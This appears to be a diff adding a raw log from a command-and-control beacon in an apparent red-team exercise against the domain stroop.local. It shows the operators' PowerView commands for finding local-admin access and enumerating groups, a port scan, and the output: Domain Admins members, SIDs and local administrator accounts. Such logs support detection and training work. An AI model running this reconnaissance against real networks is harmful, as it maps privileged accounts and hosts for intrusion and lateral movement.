+MemberDN     : CN=ADMIN-U.Kerver,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-A.Kool
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4729
+IsGroup      : False
+MemberDN     : CN=ADMIN-A.Kool,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-Z.Verheij
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4728
+IsGroup      : False
+MemberDN     : CN=ADMIN-Z.Verheij,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-S.Verbaas
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4727
+IsGroup      : False
+MemberDN     : CN=ADMIN-S.Verbaas,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-J.Mathot
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4726
+IsGroup      : False
+MemberDN     : CN=ADMIN-J.Mathot,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : ADMIN-R.Domburg
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-4725
+IsGroup      : False
+MemberDN     : CN=ADMIN-R.Domburg,OU=User,OU=Accounts,DC=stroop,DC=local
+
+GroupDomain  : stroop.local
+GroupName    : Domain Admins
+MemberDomain : stroop.local
+MemberName   : bofh
+MemberSID    : S-1-5-21-2163199188-2306780613-1636707950-500
+IsGroup      : False
+MemberDN     : CN=bofh,CN=Users,DC=stroop,DC=local
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:26:21 UTC [input] <neo> powershell find-localadminaccess -noping
+03/30 08:26:21 UTC [task] <T1086> Tasked beacon to run: find-localadminaccess -noping
+03/30 08:26:22 UTC [checkin] host called home, sent: 349 bytes
+03/30 08:26:25 UTC [output]
+received output:
+#< CLIXML
+L-WIN224.stroop.local
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:26:49 UTC [input] <neo> powershell Get-NetLocalGroup -computername l-win224
+03/30 08:26:49 UTC [task] <T1086> Tasked beacon to run: Get-NetLocalGroup -computername l-win224
+03/30 08:26:49 UTC [checkin] host called home, sent: 377 bytes
+03/30 08:26:53 UTC [output]
+received output:
+#< CLIXML
+
+
+ComputerName : l-win224
+AccountName  : STROOP/l-win224/bofh
+IsDomain     : False
+IsGroup      : False
+SID          : S-1-5-21-1770739200-3703860189-1291868052-500
+Description  : Built-in account for administering the computer/domain
+PwdLastSet   : 3/29/2020 2:17:31 AM
+PwdExpired   : False
+UserFlags    : 66049
+Disabled     : False
+LastLogin    : 3/30/2020 8:25:09 AM
+
+ComputerName : l-win224
+AccountName  : stroop.local/Domain Admins
+IsDomain     : True
+IsGroup      : True
+SID          : S-1-5-21-2163199188-2306780613-1636707950-512
+Description  : 
+Disabled     : 
+LastLogin    : 
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+ComputerName : l-win224
+AccountName  : stroop.local/Domain Users
+IsDomain     : True
+IsGroup      : True
+SID          : S-1-5-21-2163199188-2306780613-1636707950-513
+Description  : 
+Disabled     : 
+LastLogin    : 
+PwdLastSet   : 
+PwdExpired   : 
+UserFlags    : 
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:27:33 UTC [input] <neo> portscan l-win224.stroop.local 135,445,3389 none
+03/30 08:27:33 UTC [task] <T1046, T1093> Tasked beacon to scan ports 135,445,3389 on l-win224.stroop.local
+03/30 08:27:36 UTC [checkin] host called home, sent: 93245 bytes
+03/30 08:27:42 UTC [output]
+received output:
+l-win224.stroop.local:3389
+l-win224.stroop.local:135
+l-win224.stroop.local:445 (platform: 500 version: 10.0 name: L-WIN224 domain: STROOP)
+Scanner module is complete
+
+
+03/30 08:41:44 UTC [input] <MarcS> note beacon was cutoff
